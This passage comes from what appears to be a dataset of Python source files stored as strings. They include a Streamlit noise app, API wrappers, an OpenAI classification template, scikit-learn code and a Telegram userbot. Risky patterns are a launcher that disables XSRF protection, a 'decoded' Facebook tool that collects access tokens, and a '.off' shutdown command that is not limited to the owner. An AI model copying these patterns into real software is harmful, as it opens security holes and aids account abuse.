already present\r\n    if 'agreed' not in st.session_state:\r\n        st.session_state.agreed = False\r\n\r\n    # Conditionally display the disclaimer and buttons based on agreement status\r\n    if not st.session_state.agreed:\r\n        # Display disclaimer using HTML for emphasis\r\n        st.image('logo.png', use_column_width=True)\r\n        st.subheader(\"Welcome to :blue[Sound X],\")\r\n        st.subheader(\"This is a tool to record, report noise data and get information about noise exposure.\")\r\n        st.subheader(' ', divider='grey')\r\n        st.markdown(\"\"\" <div style='background-color: white; padding: 10px; border-radius: 5px;'>\r\n                        <h2 style='color: red; text-align: center;'>Disclaimer</h2>\r\n                        <p style='color: black; font-weight: bold;'>\r\n                            By using this tool, you agree to allow this app to use your device's microphone and location \r\n                            to generate noise reports. This specific user data will <strong>not</strong> be distributed.\r\n                        </p>\r\n                    </div>\r\n                    \"\"\", unsafe_allow_html=True)\r\n\r\n        # Display Agree and Disagree buttons\r\n        agree, disagree = st.columns(2)\r\n        if agree.button(\"Agree\"):\r\n            st.session_state.agreed = True  # Update state to reflect agreement\r\n            st.rerun()  # Force a rerun to refresh the page\r\n        if disagree.button(\"Disagree\"):\r\n            st.error(\"You have chosen not to agree to the terms. Please close this tab or refresh to exit.\")\r\n            st.stop()  # Stop execution to prevent any further interaction\r\n\r\n    # Display the rest of the application only if agreed\r\n    if st.session_state.agreed:\r\n        st.info(\"Please enter the details and",
    "import requests\nfrom colorama import Fore, Style\nimport json\nfrom concurrent.futures import ThreadPoolExecutor, as_completed\n\ntoken = 'YOUR_TOKEN'\n\ndef send_request(device_id):\n    url = f'https://api.io.solutions/v1/io-explorer/devices/{device_id}/summary'\n    headers = {\"Token\": token}\n    response = requests.get(url, headers=headers)\n    return device_id, response\n\ndef choose_group():\n    groups = list(set([server[\"group\"] for server in data]))\n    groups.append(\"all\")\n    groups.sort()\n    \n    print(\"Select group:\")\n    for i, group in enumerate(groups):\n        print(f\"{i+1}. {group}\")\n    \n    choice = input(\"Enter group number: \")\n    if choice == \"0\":\n        return None\n    elif choice == str(len(groups)):\n        return \"all\"\n    elif choice.isdigit() and int(choice) <= len(groups):\n        return groups[int(choice)-1]\n    else:\n        print(\"Invalid choice. Please try again.\")\n        return choose_group()\n\nexecutor = ThreadPoolExecutor(max_workers=10)\n\ndevice_ids = []\n\n# Read device IDs from JSON file\nwith open('servers.json', 'r') as file:\n    data = json.load(file)\n    for device in data:\n        device_ids.append(device['device_id'])\n\n# Filter device IDs by group\ngroup = choose_group()\nif group is not None and group != \"all\":\n    device_ids = [device['device_id'] for device in data if device['group'] == group]\n\nfutures = []\n\nfor device_id in device_ids:\n    future = executor.submit(send_request, device_id)\n    futures.append(future)\n\nfor future in as_completed(futures):\n    device_id, response = future.result()\n\n    if response.status_code == 200:\n        response_json = response.json()\n\n        if 'data' in response_json:\n            status = response_json['data']['status']\n            status_duration = response_json['data']['status_duration']\n\n            print(f\"Device ID: {device_id}\")\n\n            if status == \"up\":\n                print(f\"Status: {Fore.GREEN}Running{Style.RESET_ALL}\")\n            elif status == \"down\":\n                device = next((device for device in data if device['device_id'] == device_id), None)\n                if device:\n                    device_name = device['device_name']\n                    group = device['group']\n                    print(f\"Status: {Fore.RED}{status}{Style.RESET_ALL}\")\n                    print(f\"Device Name: {device_name}\")\n                    print(f\"Group: {group}\")\n                else:\n                    print(f\"Status: {Fore.RED}{status}{Style.RESET_ALL}\")\n            else:\n                print(f\"Status: {Fore.YELLOW}{status}{Style.RESET_ALL}\")\n\n            if status_duration:\n                print(f\"Status Duration: {status_duration}\")\n\n            print()\n        else:\n            print(f\"Device ID: {device_id}\\n{response_json}\\n\")\n    else:\n        print(f\"Device ID: {device_id}\\nError: API request failed with status code {response.status_code}\\n\")",
    "#\n# Purpose of Script: Create code to be reused for various text classifcation needs using openai \n#                     api model gpt4 \n# Author: Jake Cosgrove \n# Date: 03-29-2\n# \n# Order of Operations: \n# 1. User defines constants \n# 2. Perp data and prompt for api call \n# 3. Call openai api chat completion endpoint \n# 4. process output from api call \n# Resources: https://huggingface.co/blog/Andyrasika/logprobs-transformers\n#. The best strategy is narrowing functions to just use their parameters, and this also makes the functions relatively easy to test, as we have seen with Doctests\n\n# Outstanding TODO 04-01-2024 ----------------------------------------------------------------------------------------------------\n# - double check log prob processing [checked]\n# - add in print statements to help with debugging \n# - add in assert statements to prevent mistakes\n# - ask openai engineer if I am handling the log probabilities properly\n# - why did some logprobs start coming as NaN? \n# - I think I should just save the entire json file that is returned and then process it outstide of the async. \n\n# Load in necessary libraries\nimport pandas as pd\nimport numpy as np\nfrom openai import AsyncOpenAI # specific function for synch api calls\nimport tiktoken \nimport re # package for removing special characters strings \nimport json\nimport random\nfrom text_classification_helper_functions import * # make sure this file is in the working directory. \nfrom datetime import datetime\nimport pprint\nfrom IPython.display import display, HTML\nimport os\npd.options.mode.chained_assignment = None # silance pandas warnings \n\n##################################### User Defined Constants #########################################################################\n\n# RAW_DATA_PATH = path to data set the requires text classification. Must have at least 1 descriptive column. (Ex. Expense_Description) \n# TEXT_VARIABLE = variable with information that gpt will use to choose the category it belongs to (Often a text value describing the event)\n# TOKENS_PER_GROUP = Defines the number of tokens in each prompt that will be feed into gpt4. Higher tokens means less api calls, but each api \n#                    call will take longer. \n# API_KEY = your openai api key \n# GPT_DIRECTIONS = This is instructions to the model on how you want it to behave. \n# OTHER_CATEGORY = Boolen value. If True then the model will assign \"other\" to any values it's uncertain about. \n# TODO: for the categories list, we should include a column of the variable name so that we can join it together to it at the end. \n# CATEGORIES = A list of the categories that you would like the model to use to categorize your data (Do not include an \"Other\" Category)\n\nTEXT_VARIABLE = \"desc\"\nTOKENS_PER_GROUP = 250\nRAW_DATA_PATH = \"/Users/jakecosgrove/Documents/open_ai_api/text_classification/code_template/multiple_api_call_template/data/Other_Expenses_GPT.csv\"\nAPI_KEY = \"\"\n\nGPT_DIRECTIONS = f'''\nYou will receive a comma-separated list of expenses, each accompanied by a seven-digit description ID. \nYour task is to categorize each expense description into one of the provided expense categories based on their category ID.\nChoose ONLY from the list of categories provided here. Choose ONLY one expense category per expense presented.\n'''\n\nOTHER_CATEGORY = True\n\n# Load in a dataframe with two columns: Category Descriptions and variable names (Do Not Include an Other Category)\ncategories_data_path = \"/Users/jakecosgrove/Documents/open_ai_api/text_classification/code_template/multiple_api_call_template/data/Expenditures_mapping.csv\"\nexpense_categories = pd.read_csv(categories_data_path)\nexpense_categories = expense_categories.loc[expense_categories['Do Not Include'] != 'DO NOT INCLUDE']\n\n# Make sure column names are 'category' and 'varname' \nexpense_categories.rename(columns = {'Prompt Category':'category', 'src_varname':'varname'},inplace=True)\nCATEGORIES = expense_categories[['category', 'varname']]\n\n######################################################################################################################################################\n\n##################################### Combine together system instructions for api call ##############################################################\n\n# Accessing OpenAI with Open Research API key\nopenai_client = AsyncOpenAI(api_key = API_KEY)\n\n# Add id numbers to the list of categories you want to use (will use this key at the end to match categories back) \ncategory_id_key = create_category_id_key(CATEGORIES)\n\n# Create system instructions (aka prompt) \nsystem_instructions = create_system_instructions(GPT_DIRECTIONS, category_id_key, OTHER_CATEGORY)\n\n# Look at what system instructions look like\npprint.pprint(system_instructions)\n\n##################################### Load and prep raw data frame for api call #####################################################################\n\n# Load in data\nraw_data = pd.read_csv(RAW_DATA_PATH)\n\n# Assign a id number to keep tr",
    "# coding=utf-8\nimport requests\n\nBP_BASE_URL = \" https://api.backpack.exchange/\"\n\n\n# Markets\n\n\ndef Assets():\n    return requests.get(url=f\"{BP_BASE_URL}api/v1/assets\").json()\n\n\ndef Markets():\n    return requests.get(url=f\"{BP_BASE_URL}api/v1/markets\").json()\n\n\ndef Ticker(symbol: str):\n    return requests.get(url=f\"{BP_BASE_URL}api/v1/ticker?symbol={symbol}\").json()\n\n\ndef Depth(symbol: str):\n    return requests.get(url=f\"{BP_BASE_URL}api/v1/depth?symbol={symbol}\").json()\n\n\ndef KLines(symbol: str, interval: str, startTime: int = 0, endTime: int = 0):\n    url = f\"{BP_BASE_URL}api/v1/klines?symbol={symbol}&interval={interval}\"\n\n    if startTime > 0:\n        url = f\"{url}&startTime={startTime}\"\n    if endTime > 0:\n        url = f\"{url}&endTime={endTime}\"\n\n    return requests.get(url).json()\n\n\n# System\ndef Status():\n    return requests.get(url=f\"{BP_BASE_URL}api/v1/status\").json()\n\n\ndef Ping():\n    return requests.get(url=f\"{BP_BASE_URL}api/v1/ping\").text\n\n\ndef Time():\n    return requests.get(url=f\"{BP_BASE_URL}api/v1/time\").text\n\n\n# Trades\ndef recentTrades(symbol: str, limit: int = 100):\n    return requests.get(\n        url=f\"{BP_BASE_URL}api/v1/trades?symbol={symbol}&limit={limit}\"\n    ).json()\n\n\ndef historyTrades(symbol: str, limit: int = 100, offset: int = 0):\n    return requests.get(\n        url=f\"{BP_BASE_URL}api/v1/trades/history?symbol={symbol}&limit={limit}&offset={offset}\"\n    ).json()\n\n\nif __name__ == \"__main__\":\n    # print(Assets())\n    print(Markets())\n    # print(Ticker('SOL_USDC'))\n    # print(Depth('SOL_USDC'))\n    # print(KLines('SOL_USDC', '1m'))\n    # print(Status())\n    # print(Ping())\n    # print(Time())\n    # print(recentTrades('SOL_USDC', 10))\n    # print(historyTrades('SOL_USDC', 10))\n    pass\n",
    "import os\nimport socket\nimport sys\nfrom pathlib import Path\n\nfrom streamlit.web import cli\nfrom streamlit.web.cli import configurator_options, main\n\n\ndef is_port_in_use(port):\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n        return s.connect_ex(('localhost', port)) == 0\n\n\ndef get_available_port(start_port, max_attempts):\n    for port in range(start_port, start_port + max_attempts):\n        if not is_port_in_use(port):\n            return port\n    return None\n\n\n@main.command(\"runapp\")\n@configurator_options\ndef run_streamlit_app(**kwargs):\n    \"\"\"Runs the Streamlit application.\"\"\"\n    cli.bootstrap.load_config_options(flag_options=kwargs)\n    app_directory = Path(__file__).parent\n    filename = str(app_directory.joinpath(\"run.py\"))  # .abspath()\n\n    # Set the desired starting port and maximum attempts to find an available port\n    start_port = 8051\n    max_attempts = 10\n\n    # Find an available port to use\n    port = get_available_port(start_port, max_attempts)\n\n    if port is None:\n        print(\"Unable to find an available port to run the application.\")\n        return\n\n    # Update the Streamlit server port\n    kwargs[\"--server.port\"] = str(port)\n\n    # Run the Streamlit application\n    cli._main_run(filename, flag_options=kwargs)\n\n\nif __name__ == \"__main__\":\n    os.chdir(os.path.dirname(os.path.realpath(__file__)))\n    kwargs = {\n        \"--server.enableXsrfProtection=false\",\n        \"--server.enableCORS=true\",\n        \"--global.developmentMode=false\",\n    }\n    sys.exit(run_streamlit_app(kwargs))\n",
    "#Decoded By Hso AND Levi: @sis_f  On: @Q_B_H \n\n\n\nfoo = False\nif foo:\n    pass\nimport random\nimport re\nimport time\nimport sys\nimport requests\nfrom time import time as mek\nfrom bs4 import BeautifulSoup as par\nfrom rich.progress import Progress, TextColumn\nfrom concurrent.futures import ThreadPoolExecutor as Modol\nimport requests\nimport bs4\nimport json\nimport os\nimport sys\nimport random\nimport datetime\nimport time\nimport re\nimport threading\nimport urllib3\nimport rich\nimport base64\nimport threading\nfrom rich.table import Table as me\nfrom rich.console import Console as sol\nfrom bs4 import BeautifulSoup as sop\nfrom bs4 import BeautifulSoup as parser\nfrom concurrent.futures import ThreadPoolExecutor as tred\nfrom rich.console import Group as gp\nfrom rich.panel import Panel as nel\nfrom rich import print as cetak\nfrom rich.markdown import Markdown as mark\nfrom rich.columns import Columns as col\nfrom rich import print as rprint\nfrom rich import pretty\nfrom rich.text import Text as tekz\nimport os\nnow = datetime.datetime.today()\nmm = str(now.month)\ndd = str(now.day)\nyyyy = str(now.year)\nhour = str(now.hour)\nmi = str(now.minute)\nss = str(now.second)\nt = mm + '''/''' + dd + '''/''' + yyyy + ''' ''' + hour + ''':''' + mi + ''':''' + ss\nhours = now.hour\nx = datetime.datetime.now()\ng = datetime.datetime(2023, 9, 8, 1, 0, 0)\nif x.strftime('''%x''') > g.strftime('''%x'''):\n    print('''\n\n''')\n    print('''     ''' + ' \u0627\u0646\u062a\u0647\u0626 \u0627\u0644\u062a\u0641\u0639\u064a\u0644 \u0631\u0627\u0633\u0644 \u0627\u0644\u0645\u0637\u0648\u0631 \u0644\u0644\u062d\u0635\u0648\u0644 \u0639 \u0627\u062d\u062f\u062b \u0646\u0633\u062e\u0647@XD_0O')\n    print('''\n\n''')\n    print(x)\n    sys.exit(0)\nif x.strftime('''%x''') == g.strftime('''%x'''):\n    print('''''')\n    if x.strftime('''%X''') > g.strftime('''%X'''):\n        print('''\n\n''')\n        print('''     ''' + ' \u062a\u0631\u064a\u062f \u062a\u0641\u0639\u0628\u0644 \u0627\u062f\u0627\u0629 \u0631\u0627\u0633\u0644\u0646\u064a \u0648\u062d\u0636\u0631 \u0645\u0642\u0627\u0628\u0644\u0643 @XD_0O')\n        print('''\n\n''')\n        print(x)\n        sys.exit(0)\n    else:\n        print('''''')\nelse:\n    print('''''')\nprint('''''')\n\ntry:\n    import rich\nexcept:\n    pass\ncetak(nel('\\t\u2022WELCOME MY TOOL FACEBOOK\u2022'))\nos.system('''pip install rich''')\n\ntry:\n    import stdiomask\nexcept:\n    pass\ncetak(nel('\\t\u2022 WELCOME MY TOOL FACEBOOK \u2022'))\nos.system('''pip install stdiomask''')\n\ntry:\n    import requests\nexcept:\n    pass\nZ = '''\u001b[1;31m'''\nR = '''\u001b[1;31m'''\nX = '''\u001b[1;33m'''\nF = '''\u001b[2;32m'''\nC = '''\u001b[1;97m'''\nB = '''\u001b[2;36m'''\nY = '''\u001b[1;34m'''\nE = '''\u001b[1;31m'''\nB = '''\u001b[2;36m'''\nG = '''\u001b[1;32m'''\nS = '''\u001b[1;33m'''\nZ = '''\u001b[1;31m'''\nX = '''\u001b[1;33m'''\nF = '''\u001b[2;32m'''\nC = '''\u001b[1;97m'''\nB = '''\u001b[2;36m'''\nY = '''\u001b[1;34m'''\nC = '''\u001b[1;97m'''\nE = '''\u001b[1;31m'''\nB = '''\u001b[2;36m'''\nG = '''\u001b[1;32m'''\nS = '''\u001b[1;33'''\nprint(F + '''FACE''' + F + '\ud835\ude71\ud835\ude7e\ud835\ude7e\ud835\ude7a ' + F + 'To' + F + 'ol' + Z)\nprint(F + '\u00ae\u00ae\u00ae\u00ae\u00ae\u00ae\u00ae\u00ae\u00ae\u00ae\u00ae\u00ae\u00ae\u00ae\u00ae\u00ae\u00ae\u00ae\u00ae\u00ae')\nprint(F + '\u27a8 ' + Y + 'BY ' + E + '@XD_0O' + X + '| @XD_0O' + Z)\nprint(F + '\u00a9\u00a9\u00a9\u00a9\u00a9\u00a9\u00a9\u00a9\u00a9\u00a9\u00a9\u00a9\u00a9\u00a9\u00a9\u00a9\u00a9\u00a9\u00a9\u00a9')\nprint('''\n''')\ntoken = input(B + 'token\u27a4\u062a\u06c1\u0648\u0643\u06c1\u0646\u06c1\u0643 : ' + X)\nprint('''\n''')\nID = input(B + 'ID\u27a4\u0622\u064a\u06c1\u062f\u064a\u06c1\u0643    : ' + R)\npretty.install()\nCON = sol()\nuser_agent = [\n    '''Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/345.0.0.34.118;]''',\n    '''Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36''',\n    '''Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]''',\n    '''Mozilla/5.0 (Linux; Android 12; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36''',\n    '''Mozilla/5.0 (Linux; Android 12; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36''',\n    '''Mozilla/5.0 (Linux; Android 12; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36''',\n    '''Mozilla/5.0 (Linux; Android 12; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36''',\n    '''Mozilla/5.0 (Linux; Android 12; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36''',\n    '''Mozilla/5.0 (Linux; Android 12; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36''',\n    '''Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36''',\n    '''Mozilla/5.0 (Linux; Android 12; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36''',\n    '''Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Build/RQ2A.210305.006; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36''',\n    '''Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36''',\n    '''Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML, like Ge",
    "\"\"\"\nThe :mod:`sklearn.model_selection._split` module includes classes and\nfunctions to split the data based on a preset strategy.\n\"\"\"\n\n# Author: Alexandre Gramfort <alexandre.gramfort@inria.fr>\n#         Gael Varoquaux <gael.varoquaux@normalesup.org>\n#         Olivier Grisel <olivier.grisel@ensta.org>\n#         Raghav RV <rvraghav93@gmail.com>\n#         Leandro Hermida <hermidal@cs.umd.edu>\n#         Rodion Martynov <marrodion@gmail.com>\n# License: BSD 3 clause\n\nimport numbers\nimport warnings\nfrom abc import ABCMeta, abstractmethod\nfrom collections import defaultdict\nfrom collections.abc import Iterable\nfrom inspect import signature\nfrom itertools import chain, combinations\nfrom math import ceil, floor\n\nimport numpy as np\nfrom scipy.special import comb\n\nfrom ..utils import (\n    _approximate_mode,\n    _safe_indexing,\n    check_random_state,\n    indexable,\n    metadata_routing,\n)\nfrom ..utils._param_validation import Interval, RealNotInt, validate_params\nfrom ..utils.metadata_routing import _MetadataRequester\nfrom ..utils.multiclass import type_of_target\nfrom ..utils.validation import _num_samples, check_array, column_or_1d\n\n__all__ = [\n    \"BaseCrossValidator\",\n    \"KFold\",\n    \"GroupKFold\",\n    \"LeaveOneGroupOut\",\n    \"LeaveOneOut\",\n    \"LeavePGroupsOut\",\n    \"LeavePOut\",\n    \"RepeatedStratifiedKFold\",\n    \"RepeatedKFold\",\n    \"ShuffleSplit\",\n    \"GroupShuffleSplit\",\n    \"StratifiedKFold\",\n    \"StratifiedGroupKFold\",\n    \"StratifiedShuffleSplit\",\n    \"PredefinedSplit\",\n    \"train_test_split\",\n    \"check_cv\",\n]\n\n\nclass GroupsConsumerMixin(_MetadataRequester):\n    \"\"\"A Mixin to ``groups`` by default.\n\n    This Mixin makes the object to request ``groups`` by default as ``True``.\n\n    .. versionadded:: 1.3\n    \"\"\"\n\n    __metadata_request__split = {\"groups\": True}\n\n\nclass BaseCrossValidator(_MetadataRequester, metaclass=ABCMeta):\n    \"\"\"Base class for all cross-validators\n\n    Implementations must define `_iter_test_masks` or `_iter_test_indices`.\n    \"\"\"\n\n    # This indicates that by default CV splitters don't have a \"groups\" kwarg,\n    # unless indicated by inheriting from ``GroupsConsumerMixin``.\n    # This also prevents ``set_split_request`` to be generated for splitters\n    # which don't support ``groups``.\n    __metadata_request__split = {\"groups\": metadata_routing.UNUSED}\n\n    def split(self, X, y=None, groups=None):\n        \"\"\"Generate indices to split data into training and test set.\n\n        Parameters\n        ----------\n        X : array-like of shape (n_samples, n_features)\n            Training data, where `n_samples` is the number of samples\n            and `n_features` is the number of features.\n\n        y : array-like of shape (n_samples,)\n            The target variable for supervised learning problems.\n\n        groups : array-like of shape (n_samples,), default=None\n            Group labels for the samples used while splitting the dataset into\n            train/test set.\n\n        Yields\n        ------\n        train : ndarray\n            The training set indices for that split.\n\n        test : ndarray\n            The testing set indices for that split.\n        \"\"\"\n        X, y, groups = indexable(X, y, groups)\n        indices = np.arange(_num_samples(X))\n        for test_index in self._iter_test_masks(X, y, groups):\n            train_index = indices[np.logical_not(test_index)]\n            test_index = indices[test_index]\n            yield train_index, test_index\n\n    # Since subclasses must implement either _iter_test_masks or\n    # _iter_test_indices, neither can be abstract.\n    def _iter_test_masks(self, X=None, y=None, groups=None):\n        \"\"\"Generates boolean masks corresponding to test sets.\n\n        By default, delegates to _iter_test_indices(X, y, groups)\n        \"\"\"\n        for test_index in self._iter_test_indices(X, y, groups):\n            test_mask = np.zeros(_num_samples(X), dtype=bool)\n            test_mask[test_index] = True\n            yield test_mask\n\n    def _iter_test_indices(self, X=None, y=None, groups=None):\n        \"\"\"Generates integer indices corresponding to test sets.\"\"\"\n        raise NotImplementedError\n\n    @abstractmethod\n    def get_n_splits(self, X=None, y=None, groups=None):\n        \"\"\"Returns the number of splitting iterations in the cross-validator\"\"\"\n\n    def __repr__(self):\n        return _build_repr(self)\n\n\nclass LeaveOneOut(BaseCrossValidator):\n    \"\"\"Leave-One-Out cross-validator\n\n    Provides train/test indices to split data in train/test sets. Each\n    sample is used once as a test set (singleton) while the remaining\n    samples form the training set.\n\n    Note: ``LeaveOneOut()`` is equivalent to ``KFold(n_splits=n)`` and\n    ``LeavePOut(p=1)`` where ``n`` is the number of samples.\n\n    Due to the high number of test sets (which is the same as the\n    number of samples) this cross-validation method can be very costly.\n    For large datasets one should favor :class:`KFold`, :class:`ShuffleSplit`\n    or :class:`StratifiedKFold`.\n\n    Read more in the :ref:",
    "from pyrogram import Client, filters, __version__ as pyrogram_version\nfrom pyrogram.types import Message\nimport pyrogram\nimport random\nimport time\nimport re\nimport uuid\nimport socket\nfrom datetime import datetime, timedelta\nimport pytz\nimport psutil\nfrom sympy import sympify\nfrom typing import List\nimport requests\nimport asyncio\nfrom collections import defaultdict\nfrom typing import List\nimport aiohttp\nimport os\nimport qrcode\nimport sympy\nfrom sympy.parsing.sympy_parser import parse_expr\nimport wikipedia\nfrom bs4 import BeautifulSoup\nfrom pyrogram import emoji\nfrom collections import defaultdict\nimport string \nfrom PIL import Image\nimport binascii\nimport subprocess\nimport numpy as np\nimport logging \nfrom threading import Thread\nimport math \nfrom sympy import latex, simplify\nfrom sympy import symbols\nfrom sympy import cos, sin, pi\nimport ctypes\nimport speedtest \n\n# Setup logging in a separate thread\ndef logging_thread():\n    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')\n    logger = logging.getLogger('pyrogram')\n    logger.setLevel(logging.WARNING)\n\n    # \u0417\u0434\u0435\u0441\u044c \u043c\u043e\u0436\u043d\u043e \u0434\u043e\u0431\u0430\u0432\u0438\u0442\u044c \u043b\u044e\u0431\u0443\u044e \u0434\u0440\u0443\u0433\u0443\u044e \u043b\u043e\u0433\u0438\u043a\u0443 \u043b\u043e\u0433\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u044f, \u0435\u0441\u043b\u0438 \u044d\u0442\u043e \u043d\u0435\u043e\u0431\u0445\u043e\u0434\u0438\u043c\u043e.\n\n# \u0417\u0430\u043f\u0443\u0441\u043a \u043f\u043e\u0442\u043e\u043a\u0430 \u043b\u043e\u0433\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u044f\nthread = Thread(target=logging_thread)\nthread.start()\n\n# \u041f\u0443\u0442\u044c \u043a \u0440\u0430\u0431\u043e\u0447\u0435\u0439 \u043f\u0430\u043f\u043a\u0435\nfolder_path = \"C:/Userbot\"\n\n# \u041f\u0440\u043e\u0432\u0435\u0440\u043a\u0430 \u0438 \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u0435 \u0440\u0430\u0431\u043e\u0447\u0435\u0439 \u043f\u0430\u043f\u043a\u0438, \u0435\u0441\u043b\u0438 \u043e\u043d\u0430 \u043d\u0435 \u0441\u0443\u0449\u0435\u0441\u0442\u0432\u0443\u0435\u0442\nif not os.path.exists(folder_path):\n    os.makedirs(folder_path)\n\n# \u0421\u043e\u0437\u0434\u0430\u043d\u0438\u0435 \u0438\u043d\u0441\u0442\u0440\u0443\u043a\u0446\u0438\u0439 \u043d\u0430 \u0440\u0443\u0441\u0441\u043a\u043e\u043c \u044f\u0437\u044b\u043a\u0435\ninstructions = \"\"\"\u0414\u043b\u044f \u043f\u043e\u043b\u0443\u0447\u0435\u043d\u0438\u044f API ID \u0438 API HASH:\n1. \u041f\u0435\u0440\u0435\u0439\u0434\u0438\u0442\u0435 \u043d\u0430 https://my.telegram.org/\n2. \u0412\u043e\u0439\u0434\u0438\u0442\u0435 \u0438 \u043f\u0435\u0440\u0435\u0439\u0434\u0438\u0442\u0435 \u0432 \u0438\u043d\u0441\u0442\u0440\u0443\u043c\u0435\u043d\u0442\u044b \u0440\u0430\u0437\u0440\u0430\u0431\u043e\u0442\u0447\u0438\u043a\u0430 API.\n3. \u0421\u043e\u0437\u0434\u0430\u0439\u0442\u0435 \u043d\u043e\u0432\u043e\u0435 \u043f\u0440\u0438\u043b\u043e\u0436\u0435\u043d\u0438\u0435 \u0438 \u0441\u043a\u043e\u043f\u0438\u0440\u0443\u0439\u0442\u0435 API ID \u0438 API HASH.\n4. \u0417\u0430\u043f\u043e\u043b\u043d\u0438\u0442\u0435 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u044f \u043f\u0440\u0438 \u0437\u0430\u043f\u0443\u0441\u043a\u0435 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b.\n\"\"\"\n\n# \u0421\u043e\u0445\u0440\u0430\u043d\u0435\u043d\u0438\u0435 \u0438\u043d\u0441\u0442\u0440\u0443\u043a\u0446\u0438\u0439 \u0432 \u0444\u0430\u0439\u043b\ninstructions_path = os.path.join(folder_path, 'instructions.txt')\nwith open(instructions_path, 'w') as file:\n    file.write(instructions)\n\n# \u0421\u043e\u0437\u0434\u0430\u043d\u0438\u0435 \u0444\u0430\u0439\u043b\u0430 \u0441 \u0431\u043b\u0430\u0433\u043e\u0434\u0430\u0440\u043d\u043e\u0441\u0442\u044c\u044e\nthx_text = \"\u0421\u044b\u043f\u0430\u0441\u0438\u0431\u043e \u0437\u0430 \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u043d\u0438\u0435 Userbot! \"\nthx_path = os.path.join(folder_path, 'Thx.txt')\nwith open(thx_path, 'w') as file:\n    file.write(thx_text)\n\n# \u041f\u0443\u0442\u044c \u043a \u0444\u0430\u0439\u043b\u0443 \u043a\u043e\u043d\u0444\u0438\u0433\u0443\u0440\u0430\u0446\u0438\u0438\nfile_path = os.path.join(folder_path, 'config.txt')\n\n# \u041f\u0440\u043e\u0432\u0435\u0440\u043a\u0430 \u043d\u0430\u043b\u0438\u0447\u0438\u044f \u0444\u0430\u0439\u043b\u0430 \u0438 \u0447\u0442\u0435\u043d\u0438\u0435 API ID \u0438 API HASH\napi_id = \"\"\napi_hash = \"\"\nif os.path.exists(file_path):\n    with open(file_path, 'r') as file:\n        lines = file.readlines()\n        if len(lines) >= 2:\n            api_id = lines[0].strip()\n            api_hash = lines[1].strip()\n\n# \u0415\u0441\u043b\u0438 API ID \u0438 API HASH \u043d\u0435 \u0437\u0430\u043f\u0438\u0441\u0430\u043d\u044b, \u0437\u0430\u043f\u0440\u043e\u0441\u0438\u0442\u044c \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044f\nif not api_id or not api_hash:\n    api_id = input(\"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0432\u0430\u0448 API ID: \")\n    api_hash = input(\"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0432\u0430\u0448 API HASH: \")\n\n    # \u0421\u043e\u0445\u0440\u0430\u043d\u0435\u043d\u0438\u0435 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0439 \u0432 \u0444\u0430\u0439\u043b\n    with open(file_path, 'w') as file:\n        file.write(api_id + \"\\n\" + api_hash)\n\n# \u0412\u0430\u0448 \u0442\u043e\u043a\u0435\u043d \u0434\u043b\u044f \u0431\u043e\u0442\u0430 Pyrogram\napp = Client(\"my_bot\", api_id=api_id, api_hash=api_hash)\n            \n@app.on_message(filters.command(\"readall\", prefixes=\".\") & filters.me)\nasync def read_all_messages(client, message):\n    # Inform the user that the process has started.\n    await message.edit(\"\u041e\u0431\u0440\u0430\u0431\u043e\u0442\u043a\u0430 \u0443\u0432\u0435\u0434\u043e\u043c\u043b\u0435\u043d\u0438\u0439...\")\n    \n    async for dialog in app.get_dialogs():\n        await app.read_chat_history(dialog.chat.id)\n    \n    # Edit the message after all chats have been marked as read.\n    await message.edit(\"\u0412\u0441\u0435 \u0443\u0432\u0435\u0434\u043e\u043c\u043b\u0435\u043d\u0438\u044f \u043f\u0440\u043e\u0447\u0438\u0442\u0430\u043d\u044b!\")\n\n@app.on_message(filters.command(\"off\", prefixes=\".\"))\ndef turn_off_pc(client, message):\n    os.system(\"shutdown /s /t 0\")\n    client.edit_message_text(message.chat.id, message.message_id, \"\u041a\u043e\u043c\u043f\u044c\u044e\u0442\u0435\u0440 \u0431\u0443\u0434\u0435\u0442 